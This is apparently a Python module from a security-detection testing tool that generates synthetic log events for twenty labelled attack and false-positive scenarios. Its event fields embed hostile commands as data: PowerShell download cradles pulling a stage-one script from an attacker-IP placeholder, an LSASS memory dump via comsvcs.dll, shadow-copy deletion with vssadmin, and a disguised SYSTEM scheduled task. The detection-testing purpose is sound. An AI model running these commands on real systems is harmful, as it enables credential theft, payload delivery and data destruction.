import base64
import time
import datetime
import uuid
import random
from typing import Dict, Any, List, Optional, Tuple
from app.coordination.context import ScenarioContext, build_scenario_context
from app.coordination.timeline import TimelineManager
from app.coordination.registry import ScenarioDefinition, scenario_registry
from app.registry.entities import USERS, DEVICES, SUSPICIOUS_EXTERNAL_IPS, NORMAL_EXTERNAL_IPS
from app.generators.entra import (
    generate_entra_signin_event,
    generate_entra_directory_audit_event
)
from app.generators.windows_events import (
    generate_windows_security_logon_event,
    generate_powershell_script_block_event,
    generate_sysmon_process_event,
    generate_sysmon_network_event
)
from app.generators.defender import (
    generate_defender_process_event,
    generate_defender_network_event,
    generate_defender_file_event
)
from app.generators.firewall import (
    generate_firewall_cef_event,
    generate_firewall_threat_event,
    generate_firewall_deny_event
)
from app.generators.cloudtrail import (
    generate_cloudtrail_event,
    generate_cloudtrail_policy_event,
    generate_cloudtrail_stop_logging_event
)

# =============================================================================
# CATEGORY 1: IDENTITY & AUTHENTICATION ATTACKS (4 SCENARIOS)
# =============================================================================

def scenario_password_spraying(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-ID-01: Distributed Password Spraying across diverse accounts from a single external IP."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    
    # Spray 4 different employee accounts with failures
    test_users = USERS[:4]
    for idx, u in enumerate(test_users):
        t = timeline.get_time_at_offset(offset_seconds=idx * 8.0)
        events.append((
            generate_entra_signin_event(
                user_principal_name=u["email"],
                ip_address=ctx.attacker_ip,
                app_display_name="Microsoft 365 Exchange Online",
                is_success=False,
                error_code=50126,
                failure_reason="Invalid username or password",
                risk_level="high",
                city="Kyiv",
                country="UA",
                mfa_required=True,
                scenario_id=ctx.scenario_id,
                event_time=t
            ),
            "Microsoft Entra ID"
        ))
    
    # 5th account has password matched successfully
    t_succ = timeline.get_time_at_offset(offset_seconds=35.0)
    events.append((
        generate_entra_signin_event(
            user_principal_name=ctx.target_user["email"],
            ip_address=ctx.attacker_ip,
            app_display_name="Microsoft 365 Exchange Online",
            is_success=True,
            error_code=0,
            failure_reason="None",
            risk_level="high",
            city="Kyiv",
            country="UA",
            mfa_required=False,
            scenario_id=ctx.scenario_id,
            event_time=t_succ
        ),
        "Microsoft Entra ID"
    ))
    return events

def scenario_account_brute_force(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-ID-02: Rapid Brute Force on a targeted account followed by compromise."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    upn = ctx.target_user["email"]

    # 5 rapid failed sign-ins within 20 seconds
    for i in range(5):
        t = timeline.get_time_at_offset(offset_seconds=i * 3.5)
        events.append((
            generate_entra_signin_event(
                user_principal_name=upn,
                ip_address=ctx.attacker_ip,
                app_display_name="AWS IAM Identity Center",
                is_success=False,
                error_code=50126,
                failure_reason="Invalid username or password",
                risk_level="high",
                scenario_id=ctx.scenario_id,
                event_time=t
            ),
            "Microsoft Entra ID"
        ))

    # Breached logon on Windows endpoint using compromised credentials
    t_win = timeline.get_time_at_offset(offset_seconds=22.0)
    events.append((
        generate_windows_security_logon_event(
            device_name=ctx.target_device["device_name"],
            user_name=ctx.target_user["local_account"],
            source_ip=ctx.attacker_ip,
            is_success=True,
            logon_type=10,
            scenario_id=ctx.scenario_id,
            event_time=t_win
        ),
        "Windows Event Logs"
    ))
    return events

def scenario_impossible_travel(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-ID-03: Impossible Travel Geolocation Anomaly across distant regions within 15 minutes."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    upn = ctx.target_user["email"]

    # 1. Normal morning login from New York, US
    t1 = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_entra_signin_event(
            user_principal_name=upn,
            ip_address="198.51.100.14",
            app_display_name="Microsoft 365",
            is_success=True,
            risk_level="none",
            city="New York",
            country="US",
            scenario_id=ctx.scenario_id,
            event_time=t1
        ),
        "Microsoft Entra ID"
    ))

    # 2. Subsequent login 15 minutes later from Frankfurt, DE
    t2 = timeline.get_time_at_offset(offset_seconds=900.0)
    events.append((
        generate_entra_signin_event(
            user_principal_name=upn,
            ip_address=ctx.attacker_ip,
            app_display_name="AWS Console",
            is_success=True,
            risk_level="high",
            city="Frankfurt",
            country="DE",
            scenario_id=ctx.scenario_id,
            event_time=t2
        ),
        "Microsoft Entra ID"
    ))
    return events

def scenario_mfa_fatigue(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-ID-04: MFA Fatigue / Push Notification Harassment Attack."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    upn = ctx.target_user["email"]

    # 3 denied/ignored MFA challenges in succession
    for i in range(3):
        t = timeline.get_time_at_offset(offset_seconds=i * 20.0)
        events.append((
            generate_entra_signin_event(
                user_principal_name=upn,
                ip_address=ctx.attacker_ip,
                app_display_name="Workday HCM",
                is_success=False,
                error_code=500121,
                failure_reason="Authentication failed during strong authentication request",
                risk_level="high",
                mfa_required=True,
                scenario_id=ctx.scenario_id,
                event_time=t
            ),
            "Microsoft Entra ID"
        ))

    # 4th prompt approved by exhausted employee
    t_approved = timeline.get_time_at_offset(offset_seconds=75.0)
    events.append((
        generate_entra_signin_event(
            user_principal_name=upn,
            ip_address=ctx.attacker_ip,
            app_display_name="Workday HCM",
            is_success=True,
            error_code=0,
            risk_level="medium",
            mfa_required=True,
            scenario_id=ctx.scenario_id,
            event_time=t_approved
        ),
        "Microsoft Entra ID"
    ))
    return events

# =============================================================================
# CATEGORY 2: ENDPOINT & EXECUTION ATTACKS (4 SCENARIOS)
# =============================================================================

def scenario_powershell_abuse(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-EP-01: Obfuscated PowerShell Download Cradle with Word parent process."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    dev = ctx.target_device["device_name"]
    user = ctx.target_user["local_account"]
    encoded_cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc JAB3AGMAYQA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA..."

    # 1. Sysmon Process Creation (Event ID 1)
    t1 = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_sysmon_process_event(
            device_name=dev,
            user_name=user,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=encoded_cmd,
            parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            parent_command_line="WINWORD.EXE /n C:\\Users\\Downloads\\Invoice.docm",
            process_id=4820,
            scenario_id=ctx.scenario_id,
            event_time=t1
        ),
        "Windows Event Logs"
    ))

    # 2. PowerShell ScriptBlock Logging (Event ID 4104)
    t2 = timeline.get_time_at_offset(offset_seconds=1.2)
    events.append((
        generate_powershell_script_block_event(
            device_name=dev,
            user_name=user,
            script_text=f"IEX (New-Object Net.WebClient).DownloadString('http://{ctx.attacker_ip}:8080/stage1.ps1'); Invoke-ReflectivePEInjection",
            is_suspicious=True,
            scenario_id=ctx.scenario_id,
            event_time=t2
        ),
        "Windows Event Logs"
    ))

    # 3. Defender Process Creation Alert
    t3 = timeline.get_time_at_offset(offset_seconds=2.0)
    events.append((
        generate_defender_process_event(
            device_name=dev,
            account_name=user,
            process_name="powershell.exe",
            process_command_line=encoded_cmd,
            parent_process_name="WINWORD.EXE",
            action_type="ProcessCreated",
            scenario_id=ctx.scenario_id
        ),
        "Microsoft Defender"
    ))
    return events

def scenario_credential_dumping(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-EP-02: Credential Dumping via LSASS Memory Access."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    dev = ctx.target_device["device_name"]
    user = ctx.target_user["local_account"]
    rundll_cmd = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 648 C:\\Temp\\lsass.dmp full"

    # 1. Defender EDR Alert for LSASS Memory Access
    t1 = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_defender_process_event(
            device_name=dev,
            account_name=user,
            process_name="rundll32.exe",
            process_command_line=rundll_cmd,
            parent_process_name="powershell.exe",
            action_type="ProcessCreated",
            scenario_id=ctx.scenario_id
        ),
        "Microsoft Defender"
    ))

    # 2. Defender File Event creating minidump file
    t2 = timeline.get_time_at_offset(offset_seconds=1.5)
    events.append((
        generate_defender_file_event(
            device_name=dev,
            account_name=user,
            file_name="lsass.dmp",
            folder_path="C:\\Temp\\",
            action_type="FileCreated",
            scenario_id=ctx.scenario_id
        ),
        "Microsoft Defender"
    ))
    return events

def scenario_ransomware_canary(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-EP-03: Ransomware Canary File Encryption Activity."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    dev = ctx.target_device["device_name"]
    user = ctx.target_user["local_account"]

    # 1. Rapid sequence of file modifications with encrypted extension
    for idx, fname in enumerate(["Q3_Ledger.xlsx.locked", "Financial_Model.docx.locked", "Employees.pdf.locked"]):
        t = timeline.get_time_at_offset(offset_seconds=idx * 0.8)
        events.append((
            generate_defender_file_event(
                device_name=dev,
                account_name=user,
                file_name=fname,
                folder_path="C:\\Users\\Documents\\",
                action_type="FileModified",
                scenario_id=ctx.scenario_id
            ),
            "Microsoft Defender"
        ))

    # 2. Critical Defender Ransomware Alert
    t_alert = timeline.get_time_at_offset(offset_seconds=3.0)
    events.append((
        generate_defender_process_event(
            device_name=dev,
            account_name=user,
            process_name="vssadmin.exe",
            process_command_line="vssadmin.exe delete shadows /all /quiet",
            parent_process_name="svchost_update.exe",
            action_type="ProcessCreated",
            scenario_id=ctx.scenario_id
        ),
        "Microsoft Defender"
    ))
    return events

def scenario_persistence_task(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-EP-04: Persistence Mechanism via Windows Scheduled Task Creation."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    dev = ctx.target_device["device_name"]
    user = ctx.target_user["local_account"]
    schtasks_cmd = 'schtasks /create /tn "MicrosoftEdgeHealthUpdate" /tr "powershell.exe -enc SQBFAFgA" /sc onlogon /ru SYSTEM'

    # Sysmon Event ID 1 process creation of schtasks.exe
    t1 = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_sysmon_process_event(
            device_name=dev,
            user_name=user,
            image="C:\\Windows\\System32\\schtasks.exe",
            command_line=schtasks_cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_command_line="cmd.exe /c install.bat",
            process_id=5912,
            scenario_id=ctx.scenario_id,
            event_time=t1
        ),
        "Windows Event Logs"
    ))

    # Defender process alert
    t2 = timeline.get_time_at_offset(offset_seconds=1.0)
    events.append((
        generate_defender_process_event(
            device_name=dev,
            account_name=user,
            process_name="schtasks.exe",
            process_command_line=schtasks_cmd,
            parent_process_name="cmd.exe",
            action_type="ProcessCreated",
            scenario_id=ctx.scenario_id
        ),
        "Microsoft Defender"
    ))
    return events

# =============================================================================
# CATEGORY 3: NETWORK & PERIMETER ATTACKS (3 SCENARIOS)
# =============================================================================

def scenario_c2_beaconing(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-NW-01: Periodic Command and Control (C2) Beaconing to External Infrastructure."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []

    # 1. Firewall connection allowed
    t1 = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_firewall_cef_event(
            device_name="FW-01",
            signature_id="8001",
            name="Outbound connection",
            severity=5,
            source_ip=ctx.internal_ip,
            destination_ip=ctx.attacker_ip,
            destination_port=443,
            protocol="TCP",
            action="allow",
            rule_name="Outbound-Web",
            direction="outbound",
            application="ssl",
            user=ctx.target_user["local_account"],
            scenario_id=ctx.scenario_id,
            event_time=t1
        ),
        "Firewall logs"
    ))

    # 2. Firewall Threat Signature Match (Alert)
    t2 = timeline.get_time_at_offset(offset_seconds=0.8)
    events.append((
        generate_firewall_threat_event(
            device_name="FW-01",
            source_ip=ctx.internal_ip,
            destination_ip=ctx.attacker_ip,
            destination_port=443,
            threat_name="Suspicious TLS destination",
            action="alert",
            user=ctx.target_user["local_account"],
            scenario_id=ctx.scenario_id,
            event_time=t2
        ),
        "Firewall logs"
    ))
    return events

def scenario_port_scan(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-NW-02: Internal Network Subnet Port Reconnaissance."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []

    # Probing internal subnet across SMB, RDP, and SSH
    target_ports = [445, 3389, 22, 8080]
    for idx, port in enumerate(target_ports):
        t = timeline.get_time_at_offset(offset_seconds=idx * 2.0)
        events.append((
            generate_firewall_cef_event(
                device_name="FW-01",
                signature_id="3001",
                name="Traffic Dropped by Policy",
                severity=4,
                source_ip=ctx.internal_ip,
                destination_ip=f"10.0.1.{50 + idx}",
                destination_port=port,
                protocol="TCP",
                action="deny",
                rule_name="Default-Interzone-Deny",
                direction="inbound",
                scenario_id=ctx.scenario_id,
                event_time=t
            ),
            "Firewall logs"
        ))
    return events

def scenario_data_exfiltration(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-NW-03: Large Volume Data Exfiltration over Outbound HTTPS Channel."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []

    # Abnormally large outbound transfer (e.g. 85MB+)
    t = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_firewall_cef_event(
            device_name="FW-01",
            signature_id="8001",
            name="Outbound High Volume Transfer",
            severity=7,
            source_ip=ctx.internal_ip,
            destination_ip=ctx.attacker_ip,
            destination_port=443,
            protocol="TCP",
            action="allow",
            rule_name="Outbound-Web",
            direction="outbound",
            bytes_out=88249100,  # 88 MB out
            bytes_in=10240,
            application="ssl",
            user=ctx.target_user["local_account"],
            scenario_id=ctx.scenario_id,
            event_time=t
        ),
        "Firewall logs"
    ))
    return events

# =============================================================================
# CATEGORY 4: AWS CLOUD INFRASTRUCTURE ATTACKS (3 SCENARIOS)
# =============================================================================

def scenario_iam_privilege_escalation(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-CL-01: IAM Administrator Privilege Escalation."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []

    # AttachUserPolicy granting AdministratorAccess
    t = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_cloudtrail_policy_event(
            user_name=ctx.target_user["username"],
            source_ip=ctx.attacker_ip,
            policy_arn="arn:aws:iam::aws:policy/AdministratorAccess",
            scenario_id=ctx.scenario_id,
            event_time=t
        ),
        "AWS CloudTrail"
    ))
    return events

def scenario_logging_evasion(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-CL-02: Security Audit Logging Defense Evasion (StopLogging)."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []

    t = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_cloudtrail_stop_logging_event(
            user_name=ctx.target_user["username"],
            source_ip=ctx.attacker_ip,
            scenario_id=ctx.scenario_id,
            event_time=t
        ),
        "AWS CloudTrail"
    ))
    return events

def scenario_s3_data_exfiltration(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-CL-03: Mass S3 Bucket Sensitive Data Exfiltration."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []

    # Sequential GetObject requests on financial exports
    for idx, report_key in enumerate(["2026/Q3_KYC_Records.tar.gz", "Treasury/wire_transfers_master.csv"]):
        t = timeline.get_time_at_offset(offset_seconds=idx * 4.0)
        events.append((
            generate_cloudtrail_event(
                event_name="GetObject",
                event_source="s3.amazonaws.com",
                user_name=ctx.target_user["username"],
                source_ip=ctx.attacker_ip,
                request_parameters={
                    "bucketName": "acme-customer-kyc-documents",
                    "key": report_key
                },
                response_elements={"bytesTransferred": 45291040},
                read_only=True,
                scenario_id=ctx.scenario_id,
                event_time=t
            ),
            "AWS CloudTrail"
        ))
    return events

# =============================================================================
# CATEGORY 5: MULTI-STAGE END-TO-END ATTACK CHAINS (2 SCENARIOS)
# =============================================================================

def scenario_attack_chain_a(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-CH-01: Attack Chain A - Phishing to Cloud Data Compromise across all 5 sources."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    upn = ctx.target_user["email"]
    account = ctx.target_user["local_account"]
    dev = ctx.target_device["device_name"]

    # 1. Entra ID spray failure + success from attacker IP
    t1 = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_entra_signin_event(
            user_principal_name=upn,
            ip_address=ctx.attacker_ip,
            is_success=False,
            error_code=50126,
            scenario_id=ctx.scenario_id,
            event_time=t1
        ),
        "Microsoft Entra ID"
    ))
    t2 = timeline.get_time_at_offset(offset_seconds=12.0)
    events.append((
        generate_entra_signin_event(
            user_principal_name=upn,
            ip_address=ctx.attacker_ip,
            is_success=True,
            risk_level="high",
            scenario_id=ctx.scenario_id,
            event_time=t2
        ),
        "Microsoft Entra ID"
    ))

    # 2. Windows Event Logs - Successful logon + PowerShell execution
    t3 = timeline.get_time_at_offset(offset_seconds=30.0)
    events.append((
        generate_windows_security_logon_event(
            device_name=dev,
            user_name=account,
            source_ip=ctx.attacker_ip,
            is_success=True,
            scenario_id=ctx.scenario_id,
            event_time=t3
        ),
        "Windows Event Logs"
    ))
    t4 = timeline.get_time_at_offset(offset_seconds=42.0)
    events.append((
        generate_powershell_script_block_event(
            device_name=dev,
            user_name=account,
            script_text=f"IEX (New-Object Net.WebClient).DownloadString('https://{ctx.attacker_ip}/stage1.ps1')",
            is_suspicious=True,
            scenario_id=ctx.scenario_id,
            event_time=t4
        ),
        "Windows Event Logs"
    ))

    # 3. Defender Process Alert
    t5 = timeline.get_time_at_offset(offset_seconds=45.0)
    events.append((
        generate_defender_process_event(
            device_name=dev,
            account_name=account,
            process_name="powershell.exe",
            process_command_line="powershell.exe -NoProfile -enc VwByAGkAdABl...",
            parent_process_name="WINWORD.EXE",
            action_type="ProcessCreated",
            scenario_id=ctx.scenario_id
        ),
        "Microsoft Defender"
    ))

    # 4. Firewall C2 Alert
    t6 = timeline.get_time_at_offset(offset_seconds=50.0)
    events.append((
        generate_firewall_threat_event(
            device_name="FW-01",
            source_ip=ctx.internal_ip,
            destination_ip=ctx.attacker_ip,
            threat_name="Suspicious TLS destination",
            user=account,
            scenario_id=ctx.scenario_id,
            event_time=t6
        ),
        "Firewall logs"
    ))

    # 5. Entra Privileged Role Assignment
    t7 = timeline.get_time_at_offset(offset_seconds=75.0)
    events.append((
        generate_entra_directory_audit_event(
            user_principal_name=upn,
            ip_address=ctx.attacker_ip,
            activity_name="Add member to role",
            role_name="Privileged Role Administrator",
            scenario_id=ctx.scenario_id,
            event_time=t7
        ),
        "Microsoft Entra ID"
    ))

    # 6. AWS CloudTrail Administrator Escalation & S3 Read
    t8 = timeline.get_time_at_offset(offset_seconds=95.0)
    events.append((
        generate_cloudtrail_policy_event(
            user_name=ctx.target_user["username"],
            source_ip=ctx.attacker_ip,
            policy_arn="arn:aws:iam::aws:policy/AdministratorAccess",
            scenario_id=ctx.scenario_id,
            event_time=t8
        ),
        "AWS CloudTrail"
    ))
    return events

def scenario_attack_chain_b(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-CH-02: Attack Chain B - Ransomware Lateral Spread from Workstation to Server."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    dev_ws = ctx.target_device["device_name"]
    dev_srv = "FINANCE-SRV-01"
    user = ctx.target_user["local_account"]

    # 1. Credential dumping on workstation
    t1 = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_defender_process_event(
            device_name=dev_ws,
            account_name=user,
            process_name="rundll32.exe",
            process_command_line="rundll32.exe comsvcs.dll, MiniDump lsass.dmp",
            action_type="ProcessCreated",
            scenario_id=ctx.scenario_id
        ),
        "Microsoft Defender"
    ))

    # 2. Remote RDP logon to internal server
    t2 = timeline.get_time_at_offset(offset_seconds=15.0)
    events.append((
        generate_windows_security_logon_event(
            device_name=dev_srv,
            user_name=user,
            source_ip=ctx.internal_ip,
            is_success=True,
            logon_type=10,
            scenario_id=ctx.scenario_id,
            event_time=t2
        ),
        "Windows Event Logs"
    ))

    # 3. Canary file encryption on server
    t3 = timeline.get_time_at_offset(offset_seconds=30.0)
    events.append((
        generate_defender_file_event(
            device_name=dev_srv,
            account_name=user,
            file_name="Production_Ledger.db.locked",
            folder_path="D:\\Database\\",
            action_type="FileModified",
            scenario_id=ctx.scenario_id
        ),
        "Microsoft Defender"
    ))
    return events

# =============================================================================
# CATEGORY 6: BENIGN LOOKALIKES & FALSE POSITIVES (2 SCENARIOS)
# =============================================================================

def scenario_admin_maintenance(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-FP-01: Authorized IT Administrator Maintenance Window (CR-8821 lookalike)."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    admin_user = USERS[2]  # Michael Anderson (IT Admin)

    # 1. Sign-in from corporate branch
    t1 = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_entra_signin_event(
            user_principal_name=admin_user["email"],
            ip_address="198.51.100.14",
            app_display_name="Windows Admin Center",
            is_success=True,
            risk_level="none",
            scenario_id=ctx.scenario_id,
            event_time=t1
        ),
        "Microsoft Entra ID"
    ))

    # 2. Scheduled maintenance script execution
    t2 = timeline.get_time_at_offset(offset_seconds=15.0)
    events.append((
        generate_powershell_script_block_event(
            device_name="IT-ADMIN-01",
            user_name="admin_manderson",
            script_text="# Change Window CR-8821: Monthly Patch Verification\nGet-Service | Where-Object {$_.Status -eq 'Running'}; Restart-Service W32Time",
            is_suspicious=False,
            scenario_id=ctx.scenario_id,
            event_time=t2
        ),
        "Windows Event Logs"
    ))
    return events

def scenario_vuln_scanner(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-FP-02: Approved Vulnerability Scanner Sweeping Subnet."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []
    scanner_ip = "10.0.1.15"  # Approved scanner host

    # Firewall observes routine port sweep
    for idx, port in enumerate([80, 443, 8080]):
        t = timeline.get_time_at_offset(offset_seconds=idx * 1.5)
        events.append((
            generate_firewall_cef_event(
                device_name="FW-01",
                signature_id="8001",
                name="Approved Scanner Probe",
                severity=1,
                source_ip=scanner_ip,
                destination_ip=ctx.internal_ip,
                destination_port=port,
                action="allow",
                rule_name="Internal-Security-Audit",
                scenario_id=ctx.scenario_id,
                event_time=t
            ),
            "Firewall logs"
        ))
    return events

# =============================================================================
# CATEGORY 7: DATA QUALITY & TELEMETRY EDGE CASES (2 SCENARIOS)
# =============================================================================

def scenario_duplicate_telemetry(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-DQ-01: Duplicate Telemetry Record Ingestion to test deduplication."""
    events: List[Tuple[Dict[str, Any], str]] = []
    
    # 1. Base Defender Process event
    def_event = generate_defender_process_event(
        device_name=ctx.target_device["device_name"],
        account_name=ctx.target_user["local_account"],
        process_name="powershell.exe",
        process_command_line="powershell.exe -NoProfile -enc SQBFAFgA",
        scenario_id=ctx.scenario_id
    )
    events.append((def_event, "Microsoft Defender"))
    # Duplicate record with identical natural dedupe key
    events.append((dict(def_event), "Microsoft Defender"))

    # 2. Base Entra ID Sign-In event
    entra_event = generate_entra_signin_event(
        user_principal_name=ctx.target_user["email"],
        ip_address=ctx.attacker_ip,
        is_success=True,
        scenario_id=ctx.scenario_id
    )
    events.append((entra_event, "Microsoft Entra ID"))
    # Duplicate Entra ID record
    events.append((dict(entra_event), "Microsoft Entra ID"))
    return events

def scenario_out_of_order_telemetry(ctx: ScenarioContext) -> List[Tuple[Dict[str, Any], str]]:
    """SCN-DQ-02: Delayed and Out-of-Order Telemetry Arrival to test time-window correlation."""
    timeline = TimelineManager()
    events: List[Tuple[Dict[str, Any], str]] = []

    # Record 1: Present time event
    t_present = timeline.get_time_at_offset(offset_seconds=0.0)
    events.append((
        generate_windows_security_logon_event(
            device_name=ctx.target_device["device_name"],
            user_name=ctx.target_user["local_account"],
            source_ip="127.0.0.1",
            is_success=True,
            scenario_id=ctx.scenario_id,
            event_time=t_present
        ),
        "Windows Event Logs"
    ))

    # Record 2: Ingested NOW, but event_time is 4 minutes in the PAST (late-arriving)
    t_delayed = timeline.get_out_of_order_time(negative_offset_seconds=240.0)
    events.append((
        generate_firewall_cef_event(
            device_name="FW-01",
            signature_id="8001",
            name="Delayed Outbound Traffic Record",
            severity=1,
            source_ip=ctx.internal_ip,
            destination_ip=ctx.normal_ip,
            destination_port=443,
            action="allow",
            scenario_id=ctx.scenario_id,
            event_time=t_delayed
        ),
        "Firewall logs"
    ))
    return events

# =============================================================================
# REGISTER ALL 20 SCENARIOS INTO CENTRAL REGISTRY
# =============================================================================

SCENARIOS_DEFINITIONS: List[ScenarioDefinition] = [
    # 1. Identity (4)
    ScenarioDefinition(
        scenario_id="SCN-ID-01",
        name="Distributed Password Spraying",
        category="identity",
        classification="malicious",
        severity="high",
        mitre_attack={"tactic": "Credential Access", "technique_id": "T1110.003", "technique_name": "Password Spraying"},
        required_sources=["Microsoft Entra ID"],
        expected_detections=["ENTRA_PASSWORD_SPRAY", "IDENTITY_COMPROMISE"],
        description="Single untrusted external IP attempts authentication across multiple employees with common passwords, followed by breach.",
        generator_fn=scenario_password_spraying
    ),
    ScenarioDefinition(
        scenario_id="SCN-ID-02",
        name="Account Brute Force & Credential Compromise",
        category="identity",
        classification="malicious",
        severity="high",
        mitre_attack={"tactic": "Credential Access", "technique_id": "T1110.001", "technique_name": "Password Guessing"},
        required_sources=["Microsoft Entra ID", "Windows Event Logs"],
        expected_detections=["ENTRA_BRUTE_FORCE", "WINDOWS_REMOTE_LOGON"],
        description="Repeated failed authentications against one targeted user followed by successful logon to endpoint.",
        generator_fn=scenario_account_brute_force
    ),
    ScenarioDefinition(
        scenario_id="SCN-ID-03",
        name="Impossible Travel Geolocation Anomaly",
        category="identity",
        classification="malicious",
        severity="high",
        mitre_attack={"tactic": "Initial Access", "technique_id": "T1078", "technique_name": "Valid Accounts"},
        required_sources=["Microsoft Entra ID"],
        expected_detections=["IMPOSSIBLE_TRAVEL", "GEOLOCATION_ANOMALY"],
        description="Authentication from New York followed 15 minutes later by authentication from Frankfurt with no travel log.",
        generator_fn=scenario_impossible_travel
    ),
    ScenarioDefinition(
        scenario_id="SCN-ID-04",
        name="MFA Fatigue / Push Harassment Attack",
        category="identity",
        classification="malicious",
        severity="medium",
        mitre_attack={"tactic": "Credential Access", "technique_id": "T1621", "technique_name": "Multi-Factor Authentication Request Generation"},
        required_sources=["Microsoft Entra ID"],
        expected_detections=["MFA_FATIGUE_ATTACK", "MFA_PROMPT_BOMBING"],
        description="Repeated MFA challenges rejected in succession until user approves an unexpected challenge.",
        generator_fn=scenario_mfa_fatigue
    ),

    # 2. Endpoint (4)
    ScenarioDefinition(
        scenario_id="SCN-EP-01",
        name="Obfuscated PowerShell Download Cradle",
        category="endpoint",
        classification="malicious",
        severity="high",
        mitre_attack={"tactic": "Execution", "technique_id": "T1059.001", "technique_name": "PowerShell"},
        required_sources=["Windows Event Logs", "Microsoft Defender"],
        expected_detections=["POWERSHELL_OBFUSCATED_EXECUTION", "DEFENDER_PROCESS_SUSPICIOUS"],
        description="Office application launches obfuscated PowerShell download cradle requesting external payload.",
        generator_fn=scenario_powershell_abuse
    ),
    ScenarioDefinition(
        scenario_id="SCN-EP-02",
        name="Credential Dumping via LSASS Memory Access",
        category="endpoint",
        classification="malicious",
        severity="critical",
        mitre_attack={"tactic": "Credential Access", "technique_id": "T1003.001", "technique_name": "LSASS Memory"},
        required_sources=["Microsoft Defender"],
        expected_detections=["LSASS_MEMORY_DUMP", "CREDENTIAL_DUMPING"],
        description="Process executes comsvcs.dll minidump against LSASS to dump password hashes to disk.",
        generator_fn=scenario_credential_dumping
    ),
    ScenarioDefinition(
        scenario_id="SCN-EP-03",
        name="Ransomware Canary File Encryption Activity",
        category="endpoint",
        classification="malicious",
        severity="critical",
        mitre_attack={"tactic": "Impact", "technique_id": "T1486", "technique_name": "Data Encrypted for Impact"},
        required_sources=["Microsoft Defender"],
        expected_detections=["RANSOMWARE_ENCRYPTION_BURST", "VSSADMIN_SHADOW_DELETION"],
        description="Rapid file modifications with .locked extension and shadow copy deletion via vssadmin.",
        generator_fn=scenario_ransomware_canary
    ),
    ScenarioDefinition(
        scenario_id="SCN-EP-04",
        name="Persistence via Scheduled Task Creation",
        category="endpoint",
        classification="malicious",
        severity="medium",
        mitre_attack={"tactic": "Persistence", "technique_id": "T1053.005", "technique_name": "Scheduled Task"},
        required_sources=["Windows Event Logs", "Microsoft Defender"],
        expected_detections=["PERSISTENCE_SCHEDULED_TASK"],
        description="System utility schtasks registers an autostart payload under disguised name.",
        generator_fn=scenario_persistence_task
    ),

    # 3. Network (3)
    ScenarioDefinition(
        scenario_id="SCN-NW-01",
        name="Periodic C2 Beaconing to Malicious Infrastructure",
        category="network",
        classification="malicious",
        severity="high",
        mitre_attack={"tactic": "Command and Control", "technique_id": "T1071.001", "technique_name": "Web Protocols"},
        required_sources=["Firewall logs"],
        expected_detections=["FIREWALL_THREAT_SIGNATURE", "C2_BEACONING"],
